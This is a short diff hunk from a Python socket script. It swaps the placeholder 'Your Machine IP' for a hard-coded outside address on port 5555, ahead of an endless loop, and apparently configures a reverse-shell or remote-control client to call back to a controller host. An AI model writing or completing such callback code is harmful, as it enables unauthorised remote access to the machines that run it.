@@ -19,7 +19,7 @@ else:
 
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-socket.connect(('Your Machine IP', 5555))
+socket.connect(('37.236.199.16', 5555))
 
 while True:
 
